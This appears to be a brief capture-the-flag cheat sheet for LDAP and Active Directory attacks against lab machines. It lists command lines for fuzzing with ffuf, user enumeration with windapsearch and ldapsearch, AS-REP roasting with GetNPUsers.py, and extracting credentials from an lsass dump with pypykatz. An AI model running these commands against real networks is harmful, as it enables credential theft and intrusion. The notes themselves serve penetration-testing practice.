#### LDAP

- Tools:
  - ldapsearch
  - windapsearch
  - GetNPUsers.py
  - Evil-WinRM
  - pypykatz

- `./ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.175/FUZZ`
- `./windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U`
- `GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug`
- `ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"`
- ldap lockout policy:
  - `ldapsearch -D 'domain\user' -w 'passwrd' -p 389 -h 10.10.10.10 -b "dc=domain,dc=local" -s sub "*" | grep lockoutThreshold`
- `python windapsearch.py -d domain.local --dc-ip 10.10.10.161 -U`
- `GetNPUsers.py domain.local/username -dc-ip 10.10.10.161 -no-pass`
- `pypykatz lsa minidump lsass.DMP`
  - if find lsass.zip, unzip and use pypykatz
